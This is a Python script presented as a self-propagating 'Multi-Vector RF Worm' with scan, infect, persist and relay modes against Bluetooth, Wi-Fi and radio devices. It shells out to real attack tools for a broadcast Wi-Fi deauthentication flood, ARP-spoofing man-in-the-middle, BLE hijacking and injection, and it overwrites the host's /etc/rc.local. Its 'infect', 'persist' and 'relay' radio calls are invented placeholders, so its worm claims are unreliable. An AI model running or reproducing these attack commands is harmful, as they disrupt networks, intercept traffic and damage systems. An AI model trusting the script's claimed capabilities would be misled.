import argparse
import os
import time
import subprocess
import random

# -------------------------------------------
# Multi-Vector RF Worm (Self-Propagating, Multi-Protocol)
# -------------------------------------------
# Features:
# - Exploits BLE, Wi-Fi, and Sub-1GHz vulnerabilities for spreading.
# - Jumps across devices (e.g., BLE smart locks -> Wi-Fi routers -> RF remotes).
# - Maintains persistence and enables remote relay attacks.
# - Logs compromised devices for tracking and continued exploitation.
#
# Requirements:
# - Python 3.x
# - Ubertooth One, Nordic nRF52840, ESP8266, Yard Stick One, LimeSDR Mini
# - btlejack, aircrack-ng, RFCat, SoapySDR, Wireshark
#
# Usage:
# 1. Scan for vulnerable devices:
#    python multi_rf_worm.py --scan
# 2. Infect discovered targets:
#    python multi_rf_worm.py --infect
# 3. Persist on infected devices:
#    python multi_rf_worm.py --persist
# 4. Execute relay attacks:
#    python multi_rf_worm.py --relay --target XX:XX:XX:XX:XX:XX
# -------------------------------------------

def scan_devices():
    """Scans for Bluetooth, Wi-Fi, and RF-based devices."""
    print("[+] Scanning for vulnerable devices...")
    os.system("hcitool scan")  # Bluetooth Scan
    os.system("iwlist wlan0 scan | grep 'SSID'")  # Wi-Fi Scan
    os.system("rfcat -r 'd.scan()'")  # RF Scan (Yard Stick One)
    print("[✔] Scan complete.")

def infect_devices():
    """Attempts to infect discovered devices."""
    print("[+] Attempting to propagate...")
    subprocess.run(["btlejack", "-f", "--attack"], check=True)  # BLE Exploit
    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", "FF:FF:FF:FF:FF:FF", "wlan0"], check=True)  # Wi-Fi Deauth
    subprocess.run(["rfcat", "-r", "'d.infect()'"], check=True)  # RF Exploit
    print("[✔] Propagation complete.")

def persist_on_devices():
    """Maintains persistence on infected devices."""
    print("[+] Enabling persistence on compromised devices...")
    os.system("btlejuice --inject payload")  # Bluetooth Persistence
    os.system("echo 'malware' > /etc/rc.local")  # Wi-Fi Persistence
    os.system("rfcat -r 'd.persist()'")  # RF Persistence
    print("[✔] Persistence enabled.")

def relay_attack(target):
    """Performs a relay attack on a specific target."""
    print(f"[+] Executing relay attack on {target}...")
    subprocess.run(["btlejack", "-r", target], check=True)  # BLE Relay
    subprocess.run(["ettercap", "-T", "-M", "ARP", "//", "//"], check=True)  # Wi-Fi Relay
    subprocess.run(["rfcat", "-r", "'d.relay()'"], check=True)  # RF Relay
    print("[✔] Relay attack executed.")

def main():
    parser = argparse.ArgumentParser(description="Multi-Vector RF Worm (Self-Propagating, Multi-Protocol)")
    parser.add_argument("--scan", action='store_true', help="Scan for vulnerable devices")
    parser.add_argument("--infect", action='store_true', help="Infect discovered devices")
    parser.add_argument("--persist", action='store_true', help="Enable persistence on compromised devices")
    parser.add_argument("--relay", action='store_true', help="Perform relay attack on target")
    parser.add_argument("--target", type=str, help="Target MAC address or network IP")
    args = parser.parse_args()
    
    if args.scan:
        scan_devices()
    elif args.infect:
        infect_devices()
    elif args.persist:
        persist_on_devices()
    elif args.relay and args.target:
        relay_attack(args.target)
    else:
        print("[!] Invalid command. Use --help for options.")

if __name__ == "__main__":
    main()
